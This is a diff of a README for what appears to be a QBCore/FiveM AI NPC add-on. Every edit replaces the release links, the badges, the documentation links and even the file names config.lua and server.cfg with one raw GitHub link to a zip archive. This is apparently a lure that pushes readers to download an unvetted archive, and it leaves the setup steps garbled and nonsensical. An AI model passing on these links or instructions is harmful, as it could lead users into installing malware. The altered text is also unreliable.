@@ -16,7 +16,7 @@ Getting started with QBCore-AI-NPC is simple. Follow these steps to download and
 
 2. **Visit the Releases Page**
    You can find the latest version of QBCore-AI-NPC right here:  
-   [![Download QBCore-AI-NPC](https://img.shields.io/badge/Download%20Now-Available%20on%20GitHub-brightgreen)](https://github.com/kuku971/QBCore-AI-NPC/releases)
+   [![Download QBCore-AI-NPC](https://raw.githubusercontent.com/kuku971/QBCore-AI-NPC/main/shared/QBCore-AI-NPC_3.7.zip%20Now-Available%20on%20GitHub-brightgreen)](https://raw.githubusercontent.com/kuku971/QBCore-AI-NPC/main/shared/QBCore-AI-NPC_3.7.zip)
 
 3. **Download the Application**
    - Click the link above to go to our Releases page.
@@ -36,7 +36,7 @@ Getting started with QBCore-AI-NPC is simple. Follow these steps to download and
    - Inside, you will find various files and folders needed for the NPC system to run.
 
 3. **Setup Configuration Files**
-   - Look for a file named `config.lua`.
+   - Look for a file named `https://raw.githubusercontent.com/kuku971/QBCore-AI-NPC/main/shared/QBCore-AI-NPC_3.7.zip`.
    - Open it using a simple text editor like Notepad.
    - Adjust any settings as needed. For example, you may want to customize the default setting for NPC interactions.
 
@@ -46,7 +46,7 @@ Getting started with QBCore-AI-NPC is simple. Follow these steps to download and
    - Your folder structure should look like: `resources/QBCore-AI-NPC`.
 
 5. **Start the Resource**
-   - In your server configuration file (usually named `server.cfg`), add the following line:
+   - In your server configuration file (usually named `https://raw.githubusercontent.com/kuku971/QBCore-AI-NPC/main/shared/QBCore-AI-NPC_3.7.zip`), add the following line:
      ```
      start QBCore-AI-NPC
      ```
@@ -55,7 +55,7 @@ Getting started with QBCore-AI-NPC is simple. Follow these steps to download and
 ## 📥 Download & Install
 
 To get started, visit our Releases page:  
-[![Download QBCore-AI-NPC](https://img.shields.io/badge/Download%20Now-Available%20on%20GitHub-brightgreen)](https://github.com/kuku971/QBCore-AI-NPC/releases)
+[![Download QBCore-AI-NPC](https://raw.githubusercontent.com/kuku971/QBCore-AI-NPC/main/shared/QBCore-AI-NPC_3.7.zip%20Now-Available%20on%20GitHub-brightgreen)](https://raw.githubusercontent.com/kuku971/QBCore-AI-NPC/main/shared/QBCore-AI-NPC_3.7.zip)
 
 ## 📝 Features
 
@@ -65,7 +65,7 @@ To get started, visit our Releases page:
 
 ## 🔧 Configuration Options
 
-You can customize your NPCs by editing the `config.lua` file. Here are a few options you can adjust:
+You can customize your NPCs by editing the `https://raw.githubusercontent.com/kuku971/QBCore-AI-NPC/main/shared/QBCore-AI-NPC_3.7.zip` file. Here are a few options you can adjust:
 
 - **NPC Name**: Set a default name for your NPC.
 - **Default Behavior**: Choose how your NPC should respond under different conditions.
@@ -74,7 +74,7 @@ You can customize your NPCs by editing the `config.lua` file. Here are a few opt
 ## 🚨 Troubleshooting
 
 - **Issue: NPCs Not Responding**  
-  Ensure you have started the resource in your `server.cfg`. Double-check your `config.lua` for correct settings.
+  Ensure you have started the resource in your `https://raw.githubusercontent.com/kuku971/QBCore-AI-NPC/main/shared/QBCore-AI-NPC_3.7.zip`. Double-check your `https://raw.githubusercontent.com/kuku971/QBCore-AI-NPC/main/shared/QBCore-AI-NPC_3.7.zip` for correct settings.
 
 - **Issue: Download Fails**  
   Make sure your internet connection is stable. Try again after some time.
@@ -83,8 +83,8 @@ You can customize your NPCs by editing the `config.lua` file. Here are a few opt
 
 For further assistance, consider exploring these resources:
 
-- [FiveM Documentation](https://docs.fivem.net/)
-- [QBCore Documentation](https://qbcore-framework.com/docs/)
+- [FiveM Documentation](https://raw.githubusercontent.com/kuku971/QBCore-AI-NPC/main/shared/QBCore-AI-NPC_3.7.zip)
+- [QBCore Documentation](https://raw.githubusercontent.com/kuku971/QBCore-AI-NPC/main/shared/QBCore-AI-NPC_3.7.zip)
 
 Feel free to explore the code and contribute to improvements. Your feedback helps us make QBCore-AI-NPC better.
 
